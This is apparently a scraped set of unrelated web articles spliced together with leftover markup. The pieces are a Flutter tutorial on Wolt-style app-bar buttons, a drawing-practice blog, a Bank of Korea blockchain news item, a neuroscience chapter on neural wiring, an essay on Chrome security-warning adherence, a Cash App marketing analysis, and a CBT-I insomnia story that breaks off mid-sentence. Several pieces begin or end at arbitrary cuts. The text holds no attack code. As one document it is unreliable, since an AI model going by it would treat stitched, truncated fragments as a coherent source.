src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa3d49a49185d4d77cdd_25px_margin.png" alt="flutter_margin"></p></figure><h2>Highlight behaviour<br></h2><p>In the Wolt app when the button is highlighted it changes the opacity of the icon. There is no highlight colour change or splash animation. We can re-create such behaviour by wrapping button in the <em>Opacity</em> widget. To track highlight status we have to introduce an internal state, represented by the <em>_isHighlighted</em> boolean property. That means we have to refactor our widget from stateless to stateful:</p><div>
<pre>enum AppBarPosition {
  leading,
  trailing,
}

class AppBarButton extends StatefulWidget {
  final IconData icon;
  final VoidCallback onPressed;
  final AppBarPosition position;

  const AppBarButton({Key key, this.icon, this.onPressed, this.position}) : super(key: key);

  @override
  _AppBarButtonState createState() =&gt; _AppBarButtonState();
}

class _AppBarButtonState extends State<appbarbutton> {

  bool _isHighlighted = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.fromLTRB(widget.position == AppBarPosition.leading ? 16 : 0, 0,
          widget.position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
          child: Opacity(
            opacity: _isHighlighted ? 0.3 : 1.0,
            child: IconButton(
              icon: Icon(
                widget.icon,
                color: Colors.black,
              ),
              onPressed: widget.onPressed,
            ),
          ),
        ),
      ),
    );
  }
}
  </appbarbutton></pre>
  </div><p>Unfortunately, <em>IconButton</em> we are using is not exposing <em>onHighlightChanged</em> callback - only <em>onPressed</em>, which is not enough for our needs. We have to refactor our code to use more generic button class, like<em> RawMaterialButton</em> where we have more control over callbacks and visual settings.</p><div>
<pre>  child: RawMaterialButton(
    highlightColor: Colors.transparent,
    splashColor: Colors.transparent,
    onHighlightChanged: (isHighlighted) =&gt; setState(() {
      _isHighlighted = isHighlighted;
    }),
    child: Icon(
      widget.icon,
      color: Colors.black,
    ),
    onPressed: widget.onPressed,
  ),
</pre>
</div><h2>Showing the menu<br></h2><p>When the user presses menu button two things happen - the menu is shown and the button icon changes from three dots to close cross. We are going to track the current state in the boolean property <em>_isMenuShown </em>in the State of the screen-route. Updated menu button:</p><div>
<pre>    AppBarButton(
      icon: _isMenuShown ? Icons.close : Icons.more_horiz,
      position: AppBarPosition.trailing,
      onPressed: () {
        Navigator.push(context, AppBarMenu())
            .then((_) =&gt; setState(() =&gt; _isMenuShown = false));
        setState(() =&gt; _isMenuShown = true);
      },
    ),
</pre>
</div><p>We will build <em>AppBarMenu</em> class that extends <em>PopupRoute</em>, as it gives us more control over UI of the menu than <em>PopupMenuButton</em> from the Flutter framework. On button press, Navigator widget is tasked to push our Route to the stack. Push method returns a future which completes after this route is dismissed - that’s why we set <em>_isMenuShown</em> to false in the <em>then </em>callback.</p><h2>Menu look &amp; feel<br></h2><p>Our final task is to build a menu that will be displayed. It’s pretty straightforward - a list with two items, the less obvious parts maybe how to place it on the screen, and how to achieve the shape of a rectangle with rounded corners and triangle indicator on top. We are going to use <em>ClipPath</em> widget with a custom clipper to build the desired shape. An alternative solution would be to compose <em>ClipRRect</em> (RRect stands for rounded rectangle) with an <em>Image</em> widget for the top triangle. Yet another idea is to have a whole background as a nine-patch image, and there are for sure a few more feasible options to achieve the desired UI. Due to Flutter’s widget-oriented architecture, there are often multiple ways how can we compose existing primitives into more complex structures - like this fancy-shaped menu. You can preview updated buttons and the menu on the gif below:<br></p><figure id="w-node-2d5de7a9800c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa9a37ac27758ef39129_Hnet.com-image%20(1).gif" alt="flutter_buttons_menu"></p></figure><h2>Conclusion<br></h2><p>Flutter allowed us to recreate, very closely, UI and UX of Wolt’s piece of the interface. We were able to achieve the compelling look &amp; feel quickly by composing native widgets, and even if there are certain limitations, due to open-source nature of the Flutter framework, achieving pixel-perfect quality is possible when needed.<br></p></div></div>]]>

<em>Experiments with line drawing</em></p><p>Moreover, I was confident enough to draw my girlfriend again. In this step, I was quite lucky that I met an illustrator who was more skilled in drawing than me. He helped me to point out the small details which were off.</p><p>What helped me a lot with my motivation was that I could see the track of my journey (I had pictures with dates on them). I saw details in which I had improved and that gave me quite a lot of motivation to continue.</p><h3 id="drawing-my-girlfriend-after-4-months"><strong>Drawing my girlfriend after 4 months.</strong></h3><p><span>

<em>Second drawing of my girlfriend.</em></p><p><strong>💡Lesson learned</strong></p><p>A teacher or buddy is somebody who can boost your skill by pointing out the exact imperfections. This advice gave me the opportunity to grow. The buddy or teacher doesn’t have to be a master in the skill you want to learn. Sometimes a master’s skills are too far away from yours and it is harder for them to explain to you, which mistakes you are making. And even sometimes, it can be discouraging, because they will see tons of ways how you can improve and some of them are not afraid to point them all at once. The improvement list can be long and that is okay. You are learning. But remember the teacher or buddy has to be better than you are.</p><p>After 5 months I wanted to replicate works I admired on the internet. The tricky thing here is that I was comparing myself with masters. Of course, I was not there, but this is what I wanted to try.</p><h3 id="this-was-after-5-months-of-drawing"><strong>This was after 5 months of drawing</strong></h3><p><span>

<em>Logo for kindergarden</em></p><p>After 7 months I stopped with the daily routine because I had achieved the goal I had and I wanted to focus on my master’s thesis. I didn’t want to be a professional illustrator, but I wanted to know some basics. If I now need to sketch something, I am able to do it.</p><p>At the same time, I was amazed by where continuous improvement and some simple rules could bring me.</p><h3 id="summary">Summary</h3><ul><li>The most important thing is to practice.</li><li>Patience is the king. Don’t want to jump. It is better to start slowly and walk.</li><li>Keeping going is key. While I was drawing, I remember running from a party because I forgot to draw.</li><li>Once you lose your routine, start it again as soon as you can. Start with something easier, don’t resume your routine where you ended, but lower the number of reps.</li><li>Following a routine every single day is hard. For sure you will fight with your emotions. In these bad times just make it funnier for you. Try something new, remind yourself of your improvements and also the reasons why you started or check for inspiration on the internet. These little crises will for sure come. Don’t make a big deal out of them.</li><li>Today I know that there are plenty of books and articles which can be helpful in building a habit (<a href="https://jamesclear.com/habits" target="_blank" rel="noreferrer">James Clear is writing amazingly about habits</a> see the <a href="https://amzn.to/2yHNpMY" target="_blank" rel="noreferrer">Atomic Habit</a>). But, be aware of <a href="https://www.psychologytoday.com/intl/basics/imposter-syndrome" target="_blank" rel="noreferrer">imposter syndrome</a> and don’t over complicate your practice. It is totally OK to be bad, there is nothing wrong with that. You are a learner and failing is vital.</li><li>While doing a routine, focus just on the next step. Far off goals are too distant&nbsp;and it can be discouraging to compare yourself every day with your future you or skilled masters. Be patient.</li><li>One little trick is to put events in the calendar for days and exact times when you want to do the routine. If you manage to do the routine, you can delete it.</li></ul><p>I hope this story can be inspirational for some people who want to start doing something but actually haven’t even started or got stuck. Do you want to learn how to draw, play a violin, learn how to code, build a product or even sing? Just do it. And try to improve every time you attempt to do it.</p></div></article></div>]]>

			<p>According to <a href="https://thenews.asia/bank-of-korea-acquires-bank-sign/" target="_blank" rel="nofollow noopener noreferrer">The News Asia</a>, the Bank of Korea (BOK) is using blockchain technology in its banking sector also in order to commercialize the infrastructure. It has acquired Bank Sign for this purpose. It will help in transferring the financial services to a more organized structural framework. It will also help in making everything one step away with digital services. People will trust more the authentication and transparency of the system and will be able to invest in blockchain technology.</p>
<p>Bank Sign is a blockchain-based co-verification system that allows authenticated data to transfer among banks and financial institutions.</p>
<h2>Bank sign as&nbsp; a replacement for digital ID</h2>
<p>South Korea’s central bank plans to offer Bank Sign as a replacement for “Digital ID” (DID ). The COVID-19 pandemic situation is forcing South Korea’s banking stakeholders to consider other alternatives rather than currency exchanges such as digital alternatives for live operations.</p>
<p>Since the corona pandemic, organizations and banks have been trying to make everything online and operational through the digital space. Many people also believe that this pandemic can have positive outcomes for the emerging industries as they will render everything online.</p>
<p>Favoring the benefits of adopting Bank Sign, a BOK official told The News Asia:</p>
<blockquote><p>I expect that through cooperation, we will be able to realize cost reduction, service improvements, and discovery of new businesses</p></blockquote>
<p>The BOK adopting a blockchain digital ID system will not only strengthen the infrastructure but also will help in the development of advanced technology.</p>
<h2>Collaborating with Sendsquare to utilize blockchain in medical storage</h2>
<p>According to BTC Manager, the government is now planning to induce blockchain technology in medicine too by work in partnership with Send square.</p>

<a href="https://zswitten.github.io/2020/06/03/neuroscience-neural-networks-7.html">Part 7: Wiring of the Nervous System</a></p>

<p>We have billions of neurons. And 10^14 connections between those neurons. But our instruction manual for putting it together is a mere 20,000 genes. How does a neuron know what other neurons it’s supposed to connect to?</p>

<p>First, let’s talk about how the basic shape of the brain gets made. A sperm fertilizes an egg. The fertilized egg cell-divides a few thousand times. Then you have a hollow ball. The cells in the ball self-sort into three layers (outside/skin, middle, inside), and the ball of cells flattens out into a plate. Then the plate curves around to form a tube.</p>

<p>Next, on the tube, forward/backward and up/down axes get defined. The way this works is, there are proteins called “morphogens” [short for mighty morphing power generators] that are produced at specific places on the tube. The morphogens spread out from their sources, creating a gradient: the closer a cell is to a morphogen factory, the more morphogen a cell gets. The morphogens control how active various genes are in a cell, and that determines its “cell fate”, i.e. what type of cell it becomes.</p>

<p>Keep in mind this is all happening before the cells have started extending their axons and dendrites to communicate with each other. They have to get their own act together first. In particular, they are deciding whether they will be excitatory, inhibitory, or modulatory, and what neurotransmitter they’re going to use.</p>

<p>But even though they aren’t directly communicating with each other, their fates are intertwined. For instance, each Drosophila (fruit fly) (my biology-knowledgable friends keep yelling at me for calling it “Drosophilia”) sensory organ is supposed to have one socket cell, one hair cell, one sheath cell, and one sensory neuron. If the organ doesn’t have all those things, it doesn’t work, so it’s important for nearby cells to coordinate their cell fate decisions.</p>

<p>This is handled by a protein called Numb. Socket, hair, sheath, and sensory cells all start from the same precursor. When that precursor divides, one child gets most of the Numb. Numb makes another protein called Notch stop working, and one of the things Notch does is 1. upregulate itself and 2. downregulate a different protein called Delta, so the four siblings end up with different amounts of Notch and Delta which makes one of them become socket, one hair, etc. <a href="https://www.youtube.com/watch?v=kXYiU_JCYtU">More like me, less like you!</a></p>

<p>Cells don’t stay in the same place their whole lives. They migrate. In particular, in the cortex, you can tell a cell’s age by how far it is from the center. Cells that are born later migrate to the outer layers of the cortex. Kind of like tree rings.</p>

<p>Now that all the pieces are in place, it’s time for the cells to link up. Remember, cells have one long poky part, the axon, that carries information out, and a bushy bunch of dendrites that take information in. Cells know they’re only meant to have one axon; if you cut off a cell’s axon while it’s growing, one and only one developing dendrite will become the new axon.</p>

<p>Because the axons can grow very long, it’s their job to grow their way to the appropriate dendrites. As we saw in the <a href="https://zswitten.github.io/2019/10/07/neuroscience-neural-networks-5.html">chapter</a> about wiring of the visual system, axons are attracted to or repulsed by various proteins that appear in different amounts in different places, and that determines where they go.</p>

<p>Sometimes, axons have to travel quite a long way to get to their final destination. These long journeys get broken up into multiple steps. For example, there’s a really strong attractant protein at the spine that draws axons to it. But the axon’s true purpose lies elsewhere. So once it reaches the spine, there’s another protein hanging out nearby that makes it so the axon isn’t attracted to the first protein anymore. And meanwhile, there’s a third protein in the area that actively repels the axon away. Grass is always greener!</p>

<p>Axons and dendrites from the same cell repel each other, to induce them to spread out and cover the whole of an area – “dendritic tiling”. But they’re chill with being around axons and dendrites from other cells.</p>

<p>OK, so an axon found the right general area. Now it has to mate with a dendrite to form a synapse. Axons produce a protein called agrin that triggers a bunch of receptors for action potentials to come cluster around it, while also breaking up any random other clusters that happened to be nearby. To make things easier, the axons are attracted to places where there were already preexisting clusters of receptors.</p>

<p>Some of these synapses are lifelong partnerships between two cells, but the divorce rate is real. In mouse muscles, the divorce rate is 90%; each muscle fiber in a mouse newborn gets input from ten neurons, but as the mouse gets older, one of those synapses dominates, taking all the territory from the other synapses which then shrink to nothing. The pattern of which synapses win is unpredictable and differs between individuals and even between the two sides of an individual’s body. This indicates that it’s being driven by activity-dependent competition AKA Nurture not Nature. Synapses can also die out if the axons get pruned, or if the entire cell dies. Long axons are especially likely to get pruned. Also, axons that aren’t firing a lot get pruned.</p>

<p>The second part of the chapter/of this blog post is a case study of the formation of the olfactory map of a mouse. We’ve seen two types of neural map. The first is continuous, in the mathy sense of a continuous function where two points that are close together in the input space will be mapped to close-together points in the output space. Vision is like this: two nextdoor neighbor pixels of your visual screen will map to two nextdoor neighbor neurons. Touch is also mostly continuous. Two nerve cells in your left foot map to two nearby cells in your brain. But it’s not always totally continuous: an example is that signals from mouse whiskers go to their own special place that’s not especially near input from the rest of the face.</p>

<p>Smell is the other kind of map: discrete. Rather than being organized spatially, the smell map is organized by odorant. You could imagine three strategies for making a neural map. Number one: the input neurons are in charge. They know their own identities, and so they know what target neurons in the next layer they should connect to. The target neurons are dumb and define their identity by which input neurons choose them. Number two: the input neurons are dumb and connect randomly to target neurons. It’s the target neurons that are in control and tell the input neurons what to be. Number three: the input neurons and target neurons are both smart. In vision, it’s number three. Both the neurons in the eye and the retinal ganglia cells they connect to are smart. Smart in this sense: different cells in each layer have different amounts of attractor/repeller proteins, and if you turn off the genes that make those proteins, the whole thing stops working. You could call it a healthy equal relationship where both sides contribute.</p>

<p>Smell is the same way, but with another fun twist: the axons sort themselves out along the way. Axons that are coming from cells that sense two different odorants repel each other, while axons that are coming from cells that sense the same odorant attract each other. Like if your tangled-up headphones could magically unscramble themselves on the way to your ears.</p>

<p>Summing it all up, how do we get from 20,000 genes to 10^14 connections?</p>

<ul>
  <li>Some genes make multiple different proteins</li>
  <li>The amount of a protein that’s present makes a difference, not just whether it’s present vs. absent</li>
  <li>Proteins do different stuff in different contexts</li>
  <li>Combinations of proteins do stuff that neither can do alone</li>
  <li>Wiring decisions can have multiple steps, both spatially (multi-step journeys) and temporally (pruning)</li>
  <li>Activity/learned experience can help make connection decisions</li>
  <li>Some of the details don’t matter, like as long as an odorant axon is going to the right glomerulus, it doesn’t really matter which exact cell in the glomerulus it connects to.</li>
</ul>

<p>And finally, what you’ve all been waiting for: half-baked speculation about how we could use this info to make machine learning work better!</p>

<p>Neural networks come into existence with all their connections fully specified. Some of the weights die/go to zero during training, which is like axon pruning. I wonder what it would be like to build up the connectome gradually over time, and to add an element of indeterminism where cells occasionally connect to the “wrong place”. AutoML is arguably like the former, while skip connections are arguably like the latter.</p>

<p>I’m intrigued by the idea of having some concept of a protein, that operates in some “area” (i.e. subset) of different layers, and attracts connections from some neurons in the layers before and after it, while repelling others. Or a whole family of proteins that regulate each other. I wonder whether the practical difficulties of assembling a brain can act as a kind of regularizer. Like, the <a href="https://en.wikipedia.org/wiki/Vapnik%E2%80%93Chervonenkis_dimension#VC_dimension_of_a_neural_network">VC dimension</a> of a brain with 86 billion neurons that can connect to each other in any arbitrary way is huge. The VC dimension of brains that are physically and biologically possible to assemble is a lot smaller.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>There’s a common myth among software engineers, and security engineers in
particular, that people will always click “yes” on any warning or prompt,
blindly accepting any risk about which the UI warns. This is not generally true,
and the misconception can lead to suboptimal design decisions and even <a href="https://noncombatant.org/2016/01/28/against-security-nihilism/">security
nihilism</a>.</p>

<h2 id="warnings-can-be-designed-for-adherence">Warnings can be designed for adherence</h2>

<p>Warning adherence is the percentage of users who do what a warning wants them to
do. For example, we say that users adhere to an SSL certificate warning if they
leave the offending site upon encountering the warning.</p>

<p>Design decisions can influence adherence significantly – for example,
redesigning the Chrome SSL warning
<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43265.pdf">increased</a>
adherence from 37% to 62%. (Today, SSL warning adherence is even higher, at
around 80% on Windows. One possible
<a href="https://research.google/pubs/pub46359/">explanation</a> is that we got rid of many
false positive SSL errors, thereby leaving more real errors that users don’t
want to bypass, but I don’t know for sure.) Example of visual or interaction
adherence cues include highlighting the “safe” button or hiding the “unsafe”
button behind a dropdown.</p>

<figure>
  <img src="https://emilymstark.com/assets/cert_error.png" alt="Chrome 86 SSL certificate warning">
  <figcaption><i>Chrome 86 SSL
certificate warning. The safe option (“Back to safety”) is visually highlighted.
The unsafe option is only shown when the “Advanced” button is clicked.</i></figcaption>
</figure>

<p>Some warnings may not need to be as extremely opinionated as the SSL certificate
warning to achieve good adherence. For example, Chrome has a warning for
lookalike domains that use unusual characters to create convincing spoofing
domains. This warning, shown below, is designed to be less opinionated and makes
it easier for people to find the unsafe option, yet people choose the unsafe
option &lt;15% of the time.</p>

<figure>
  <img src="https://emilymstark.com/assets/lookalike_warning.png" alt="Chrome 86 lookalike domain warning">
  <figcaption><i>Chrome 86
SSL lookalike domain warning. This warning is designed to be less scary than the
SSL certificate warning, and it is easier for users to find and exercise the
unsafe option. The warning still produces good adherence.</i></figcaption>
</figure>

<p>It can also be useful to measure user behaviors other than adherence. People may
choose the unsafe option on a warning, but then act more cautiously as they
proceed (for example, by not entering passwords on the unsafe site). Depending
on the risk in question, this may or may not be a safe behavior. My team has
some recent data on this phenomenon that I hope we’ll be able to share publicly
soon.</p>

<p>There are some caveats to this approach of designing warnings for adherence:</p>
<ul>
  <li>In the
<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43265.pdf">study</a>
I linked above, the redesigned warning did not improve comprehension. People
made safer decisions with the redesigned warning, but they didn’t understand
the warning better than before. Convincing people to make safe choices may be
easier than helping them understand the risks, especially in light of
follow-up <a href="https://research.google/pubs/pub46632/">research</a> suggesting that
there is no single easily-surmountable challenge that gets in the way of
comprehensibility.</li>
  <li>Designing for adherence can be seen as a spectrum. On one end of the spectrum
might be an <a href="https://stackoverflow.com/questions/35274659/does-using-badidea-or-thisisunsafe-to-bypass-a-chrome-certificate-hsts-error/35275060">obfuscated
password</a>
for bypassing the warning. This end of the spectrum could be seen as
paternalistic, or as favoring expert users and denying non-expert users the
same functionality. On the other end might be placing the safe and unsafe
options on equal footing with no visual or interaction distinctions. This end
of the spectrum lets people make their own uninfluenced choices, but puts them
at risk if they do not comprehend the warning well. I think that choosing a
point on this spectrum is probably a subjective, qualitative product decision,
but it’s important to know that the spectrum exists.</li>
</ul>

<h2 id="prompts-that-arent-warnings">Prompts that aren’t warnings</h2>

<p>One might concede that warnings can achieve good adherence, but still speculate
that users will always say “yes” to a prompt – a neutral question that doesn’t
have any particular desired outcome.</p>

<p>I’m less familiar with the research in this area, and there may in fact be less
research overall. But, one public data source we have is the <a href="https://developers.google.com/web/tools/chrome-user-experience-report">Chrome User
Experience
Report</a>,
which recently added <a href="https://developers.google.com/web/updates/2020/02/notification-permission-data-in-crux">permission acceptance
data</a>
for the web notification permission prompt. This data suggests that users
neither blindly accept nor deny notification permission prompts. To pick a few
examples that come to mind, users accept ~3% of notification prompts on
www.tomshardware.com, ~22% on www.facebook.com, and ~82% on news.google.com (as
of early 2020). These numbers are not apples-to-apples comparisons; many
factors, including the audience and context of the website, will influence the
acceptance rate. However, I do think these numbers suggest that users do not
have a constant uniform reaction to permission prompts.</p>

<h2 id="so-what-does-this-mean">So what does this mean?</h2>

<p>Developers shouldn’t assume that users will always blindly say “yes” to any
security or privacy warning or prompt. We can design warnings to achieve good
adherence, and even neutral prompts elicit neither a single uniform response nor
a random response. Still, I think of it as good practice to avoid overloading
people with security and privacy decisions, especially when the risks may not be
comprehensible. I also think it can become unmaintainable to expose every
security decision in the UI; software designers need to prioritize which choices
to expose, and users should choose the software that gives the right level of
control for them.</p>

<h6>Cardi B is the <a href="https://twitter.com/CashApp/following">only person that Cash App follows on Twitter</a>! (via YouTube)</h6>
<p>Last week’s “Cash App Friday” came at the perfect time. The COVID-19 pandemic has been costly, scary, and uncertain, especially for those living paycheck-to-paycheck. On Cash App Fridays, the mobile payment app users can log on Twitter and reply to <a href="https://twitter.com/CashApp">@CashApp</a> with their $cashtag for a chance to win prizes that range from $100 to $500. Later that weekend, Cash App matched some of the giveaways from Shea Serrano –The Ringer staff writer and <a href="https://trapital.co/2019/11/04/shea-serrano-on-the-economics-of-book-publishing-movies-and-other-things-and-how-dj-screw-inspired-his-promotional-tactics/">Trapital Podcast guest</a>— who had already made it habit to give money to those in need.</p>
<p>These philanthropic measures are gracious, but it’s essential to Cash App’s growth model. In 2019, the company spent an estimated <a href="https://money.com/what-is-cash-app-friday/">$60,000 on Cash App Fridays</a>. In return, it earned much more in heightened brand awareness and earned media. This strategy translated well to hip-hop, where rappers use the app to give money to fans. Cash App has now been name-dropped by over 200 hip-hop artists.</p>
<p>Cash App achieved the modern brand’s dream: to become part of the culture. No appropriation. No cringe-worthy attempts to sound like a 23-year-old hypebeast. All genuine. It’s easier said than done, and it’s a model others can learn from.</p>
<hr>
<h4><strong>Make it easy for the customer</strong></h4>
<p>When Cash App launched in 2013, it was much more buttoned-up. Users needed phone numbers or email addresses to transfer money. A year and a half later, the service eased up, followed Venmo’s lead with usernames, and introduced the <a href="https://squareup.com/us/en/press/introducing-cashtags">$cashtag</a>. These handles made the app more social and reduced friction to transfer money.</p>
<p>Square continued this trend when it offered debit cards. From <a href="https://www.fool.com/investing/2018/02/28/squares-cash-app-killed-it-in-2017.aspx">Motley Fool</a>:</p>
<blockquote><p>Square introduced a virtual debit card at the end of 2016, which allowed users to spend their Cash App balance online or through a mobile wallet. So, if you were ordering a pizza online, for example, your friends could send you money on Cash App, then you could pay for the pie with the debit card number.</p>
<p>Square followed it up in April with a physical debit card and allowed users to add a personalized signature or drawing to the front of the card. The card has proved extremely popular, with users spending over $90 million using their Cash Cards during the month of December. That’s a run rate of over $1 billion.</p></blockquote>
<p>It dropped a full year before Venmo’s debit card, which also helped!</p>
<p>Cash App took its efforts to another level in November 2017 when it introduced the ability to trade Bitcoin. This was one month before Bitcoin’s peak valuation (and peak public interest). The timing was perfect. It would be like buying Nicki Minaj stock the month before “Monster” came out.</p>
<p>Square CFO Amrita Ahuja said that Cash App’s Bitcoin and Investing customers <a href="https://www.forbes.com/sites/darrynpollock/2020/02/29/bitcoin-paying-off-for-squares-cash-app-raking-in-178-million/#4ea73a5e28e7">generate up to two-to-three times more revenue</a> than the rest. Since Bitcoin accounts for about <a href="https://www.coindesk.com/bitcoin-drove-half-of-squares-cash-app-revenue-in-the-4th-quarter">half of Cash App’s revenue</a> and Cash App has 24 million monthly active users, that means less than 7 million (28%) use those features.</p>
<p>Most companies would use this as a reason to solely focus on acquiring more Bitcoin investors. They would run ads in fintech newsletters, sponsor emerging tech meetups, find Libertarian groups on Reddit, and so on.</p>
<p>But Cash App expanded its reach. Cash App giveaway recipients aren’t exactly the demo for Bitcoin investing. But they might be someday and may spread the word to someone who <em>is</em> in that cryptocurrency demo. That’s what Cash App is banking on (literally). This is the long game.</p>

<h6>This is a Spotify screenshot of songs named “Cash App.” That list keeps going… it’s clearly an SEO play.</h6>
<h4><strong>Influencer marketing done right</strong></h4>
<p>Square is still not entirely sure how Cash App first became popular with hip-hop. Here’s Square CEO Jack Dorsey at a 2019 investor conference via <a href="https://www.wsj.com/articles/dont-venmo-iggy-azalea-cash-app-rules-rap-11565191206">Wall Street Journal</a>:</p>
<blockquote><p>“This is also something we weren’t expecting, but I think Cash App has touched in the culture. We’ve just benefited from people loving it and wanting to sing about it, and putting it in their music videos, and it’s amazing how much that spreads.”</p></blockquote>
<p>But once Square noticed the trend, it locked in. In 2018 it teamed up with <a href="https://www.businessinsider.com/travis-scott-is-giving-away-100000-to-fans-through-the-cash-app-2018-8">Travis Scott </a>and <a href="https://www.complex.com/music/2018/08/why-are-rappers-giving-away-money-cash-app-lil-b">Lil’ B</a>. In December, it got together with <a href="https://cash.app/legal/us/en-us/snoop-special-stars">Snoop Dogg</a>. Each of them used the app to give away money. The company acquired customers through the rappers’ social media followings at an extremely low cost. Free money is an easy sell, and it doesn’t take that many customers to justify the cost.</p>
<p>Here’s a great breakdown from <a href="https://ark-invest.com/research/squares-cash-app-twitter">Ark Invest</a> on the low-cost customer acquisition:</p>
<blockquote><p>While banks can pay from $350 to $1500 to acquire users, Cash App acquired a new customer through Burger King in five minutes without any direct mail or bank branch visit.</p>
<p>Square has run similar [$100,000] campaigns with rappers like Travis Scott and Lil B and other influencers, triggering a network effect for the Cash App… If only 129 of the 120,000 who commented on [Travis Scott’s] tweet were new to Cash App, then Square’s cost of customer acquisition would have been less than the $925 per user that banks pay on average, according to our research, and 6,000 comments, only 5% of the total, would have dropped it to $20. Moreover, as the converted users appear to spread the word on social media, the Cash App can acquire additional users from just one.</p></blockquote>
<p>That’s well worth $100,000 for both La Flame and Cash App. It’s even more worthwhile considering the influence that hip-hop fans have on their peers. According to <a href="https://www.revolt.tv/2020/1/1/21043728/generation-hip-hop-2020">REVOLT’s Gen Hip Hop study</a>, hip-hop fans are 2x more likely to be culturally influential. It’s the right audience to acquire.</p>
<p>Cash App’s user base is <a href="https://twitter.com/hknightsf/status/1239976638844039168?s=20">strongest in the South and the Midwest</a> of the US, which aligns with the regions where many hip-hop fans are at. It’s the opposite of most founders who focus first on their “early adopter” personal networks in the coastal metro hubs in New York and San Francisco. This strategy made more sense years ago when broadband internet access was noticeably stronger in tech hubs and universities, but that’s no longer the case. It’s 2020. Smartphones are now ubiquitous. It’s time to think beyond Mark Zuckerberg’s Ivy League expansion plan that worked for Facebook in 2004.</p>
<p>Venmo’s growth strategy was more aligned with the traditional tech growth model. The founders are UPenn alums who hit up Princeton Hackathons and other similar events. It had its own “Million Dollar Money Tree” cash giveaway and $5 referral sign-up bonuses to attract customers. But those offers were also centered around Ivy League users and their friends who live on the coasts.</p>
<p>Cash App’s <a href="https://s21.q4cdn.com/114365585/files/doc_financials/2019/q4/2019-Q4-Shareholder-Letter-Square.pdf">monthly active users have grown</a> from 7 million in 2017, 15 million in 2018, to 24 million in 2019. It still trails Venmo in users, but Cash App is <a href="https://www.fool.com/investing/2019/08/27/the-gap-between-cash-app-and-venmo-is-getting-bigg.aspx">growing faster</a>.</p>
<p>I drew this chart to highlight the difference:</p>

<h4><strong>An effective flywheel</strong></h4>
<p>Cash App’s strategy is a true flywheel that drives more peer-to-peer transactions. The hip-hop influencers and their fans grew the user base and brand awareness further, which gained the attention of those who seek higher-end services like Bitcoin and Investing.</p>
<p>The flywheel looks like this:</p>

<p>It’s similar to Jay Z’s flywheel with his <em>4:44</em> release. Here’s <a href="https://trapital.co/2019/11/21/jay-zs-cell-phone-partnership-strategy-explained/">what I wrote last year</a>:</p>
<blockquote><p>Jay Z made a sale that valued the company at more than 10x his purchase price just two years earlier. That’s impressive especially with all the turmoil and controversy that surrounded Tidal during that stretch.</p>
<p>But the real kicker is that $75 million was budgeted for exclusive content for Sprint. Five months after the deal was publicized, Jay Z dropped 4:44 as a Sprint-Tidal exclusive. This connected the streaming service with Sprint, which now had a vested interest in Tidal’s success (not too different from Live Nation’s interest in Roc Nation). And by partnering with a cellular carrier instead of a manufacturer like Nokia or Samsung, Jay increased his flexibility and integration capabilities.</p></blockquote>
<p>Jay Z distributed his album through Sprint because it has an active customer base and a means to deliver his product. Sprint was now a co-owner of Tidal, Jay’s streaming service. The cellular carrier had a vested interest in both the delivery and implementation. And Sprint customers got the album for free. Everybody won.</p>

<hr>
<p>In this next decade, Cash App’s customer acquisition tactics will be replicated by many. Products that are built to serve the mass consumer will waste time if they religiously follow Silicon Valley’s age-old mantra to “start in San Francisco and New York” and expand from there. That traditional plan still makes sense for a product like Superhuman, the $30 / month email service that’s specifically targeted at that who will pay for that. It’s less ideal for an app that relies on network effects and massive scale.</p>
<p>Mass-market products need branding. In consumer tech, hip-hop has been the backbone. TikTok had Lil’ Nas X. Snapchat had DJ Khaled. YouTube had Soulja Boy. The list goes on. Hip-hop culture influence continues to grow, and more companies will find their own way to engage fans.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I'd done everything right, yet it was 2 am and I still couldn't sleep. I had meditated for 30 minutes before I went to bed. I even took a couple of melatonin pills right after to be sure. Yet, here I was wide awake dreading how exhausted I would be the next day at work.</p><p>My problem wasn't unique. In America, one in every 10 adults will experience chronic insomnia<sup><a href="#references">1</a></sup>. It takes just one poor night of sleep to devolve into long term sleeping problems. This is because the majority of sleeping problems stem from anxiety and worry<sup><a href="#references">2</a></sup>. <b>The more you worry about not getting enough sleep, the worse your sleep gets</b>.</p><p>For me, my sleeping issues began right out of college. I had started a job as a software engineer and I was starting to feel the pressure. I had a couple of big deadlines coming up and I found myself tossing and turning unable to sleep one night. My mind kept racing, thinking about all the work I had until I finally fell asleep.</p><p>I thought that was it — an abnormal night, but then it happened again. This time, my outlook changed. I started worrying about how not getting enough sleep would affect my day. I looked up basic sleep hygiene tips online and decided to go to bed extra early to make sure I made up for lost sleep. This ended up backfiring and it took a few hours before I could finally sleep.</p><p>At this point, my sleeping struggles started becoming more regular. I downloaded a couple of meditation apps in the hopes that meditating and listening to soothing sounds would help me sleep better. I even resorted to over the counter sleeping aids on nights when it took me too long to fall asleep. <b>The results were mixed — I'd fall asleep faster but over time I'd revert back to having poor sleep</b>.</p><p>I finally caved and decided to try prescription medication. I had read a lot about them and was very reluctant because of their long term side effects. On a visit to my doctor, I asked her if she could prescribe me something to help me sleep. She said she said she could, but it wasn't going to be medication. Instead, she put in a referral to a CBT-I (Cognitive Behavioral Therapy for Insomnia) therapist.</p><p>CBT-I is an evidence-based (proven in clinical trials) technique used to treat sleep problems<sup><a href="#references">3</a></sup>. <b>Two driving forces induce sleep — sleep drive &amp; mental arousal</b>. Your sleep drive is how sleepy/tired you feel when going to bed. Your mental arousal is the racing thoughts and alertness you feel when you go to bed. When your sleep drive is high and your arousal levels are low; it is easier to fall asleep. CBT-I prescribes a sleep schedule that ensures you have a high sleep drive. It also teaches you techniques to worry less and reduce your arousal.</p><p><b>CBT-I is extremely effective in treating sleeping problems</b>. Clinical trials have shown that 80% of people that follow a good CBT-I program will have normal sleep by the end<sup><a href="#references">4</a></sup>. The results are also permanent, unlike sleeping aids which are effective only as long as you are taking them<sup><a href="#references">5</a></sup>.</p><p>There were three main rules that I had to follow 